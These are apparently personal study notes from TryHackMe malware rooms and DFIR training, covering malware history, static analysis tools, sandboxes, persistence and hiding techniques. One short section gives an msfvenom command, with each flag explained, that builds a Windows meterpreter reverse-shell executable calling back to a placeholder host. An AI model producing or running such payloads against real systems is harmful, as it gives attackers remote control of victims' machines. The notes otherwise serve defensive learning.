1. ###### History ([room](https://tryhackme.com/room/historyofmalware))
- malware = malicious software
- 1971 - first malware - Creeper
- 1973 - first "antivirus" - Reaper (was created to remove any copy of Creeper)
- 1974 - Wabbit - reproducing as fast as rabbits → computer would choke on their own resources; did not spread through network
- 1975 - ANIMAL - first Trojan
- 1982 - Elf Cloner - first microcomputer virus, boot sector virus, spread to US Navy
- 1986 - Computer Fraud and Abuse act

2. ###### Intro ([room](https://tryhackme.com/room/malmalintroductory))
- when analysing it's important to consider: 
	- Point of Entry
	- indicators of malware being executed on a machine
	- what does the malware do
- attacks - targeted vs. mass campain
- malware attack process breakdown:
	1. Delivery
		- USB, PDF attachment,...
	2. Execution
		- what does it do - encypting files, logs keystrokes, displays ads,...
	3. Maintaining persistence (not always the case)
	4. Propagation (not always)
- two categories of fingerprints:
	- host-based signatures - results of execution and any ppersistence performed by malware
	- network-based signatures - network communication taking place during delivery, delivery and propagation
- two types of malware analysis:
	- static 
		- gaining high level abstraction of the sample
		- PE Explorer, PeID, IDA, WinDg
	- dynamic - usualy involves executing the sample

3. ###### Analysis- 
	1. Static analysis
	- MD5 checksum
		- on Windows: [HashTab](http://implbits.com/products/hashtab/)
		- in Linux: md5checksum or md5deep
		- lookup the MD5 checksum - Virustotal,...
	- identify the compiler/packer of a file
		- PeID (W), [Detect it Easy](https://github.com/horsicq/Detect-It-Easy) (L)
		- packing is a form of obfuscation
		- in IDA - check Imports - obfuscated code has little to no Imports
	- strings ([room](https://tryhackme.com/room/malstrings))
		- text/numbers contents of a program
		- can contains credentials, Bitcoin addreses
		- SysInternalsSuite → Strings (W), strings (L)
	- imports
		- PE Explorer (W GUI), IDA
	- automated analysis with [[binwalk]]
	- more condensed summary with [[exiftool]]

1. ###### Research ([room](https://tryhackme.com/room/malresearching))
- checksums + VirusTotal
- online sandboxes - [any.run](https://any.run/), [hybrid-analysis](https://hybrid-analysis.com/)



##### Create Malicious Executable
- `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<host_IP> LPORT=<destination_port> -f exe -o maliciousfile.exe`
	- `-a`: architecture
	- `--platform`: windons/linux
	- `-p`: payload
	- `-f`: file extension
	- `-o`: output file

##### DFIR Training
- 3 general concepts w/ malware:
	1. starting
		- persistent vs one time
		- triggered
			- the OS is configured to launch the malicious exe/service based on some event (system startup, user login, schedule,...)
		- trick launch
			- convince the user to run the process, eg. replace existing program w/ malware, place malware in folder such that a normal process will launch it instead of the intended exe
		- trick loading
			- tricks a process to load a malicious library
		- data injection
			- exploit process that does not check validity of its inputs
	2. hiding
		- hide itself - modify OS data structures to make it invisible from some APIs
		- parasite - pick an innocent process, take over control, start malicious threads in it and exit original process
		- hollowing - start a process for a purpose of taking it over
		- ...
	3. doing bad things
-  is there Single Artifact Category? → No
	-  break it up:
		-  startup - Are there malicious persistence mechanisms?
		-  running - Are there malicious processes running?
		-  remnants - Are there signs that malware was run?
1. Persistence
	- how to identify if a program/process/library is malicious?
		-  Thread Inteligence: It the program's hash on a "known bad" list?
		-  Statis analysis: Does the program have byte-level signatures from previous malware? 
		-  Dynamic analysis: Does the program have malicious behaviour?
		-  Reverse Engineering: Does the program have instructions that are malicious? 
	-  triggered (malicious triggered programs)
		-  Triggered Program Artifacts Store:
			-  path to program to be launched, trigger (startup, at login,...), user/privilege (is it a service?), (a date of creation)
			-  lots of places: Registry, Startup Folder, Scheduled Tasks, WMI Actions,...
		-  how to analyze:
			-  need to analyze the program instructions - engines, sandboxes,...
			-  prioritize the files based on: the the program normally there? is the program in a suspicious location? does the trigger/program have times similar to the incident? is the program signed by a legitimate authority? is the program on other systems in the enterprise?
	-  trick launch (malicious programs that could get accidentaly launched)
		-  no Single Artifacts Store → too many ways to trick someone/something - exes in path, exes in attachments, shortcuts
			-  → but can be explored by previous techniques
	-  trick loading (malicious libraries that could get accidentaly loaded)
		-  Artifact category (eh not Single)
			-  LoadLibraryPathFile - contains the libraries in the load path
			-  BUT load libraries often include the same folder as the exe - its relative → we need to consider nearly every library
2. Running
3. Remnants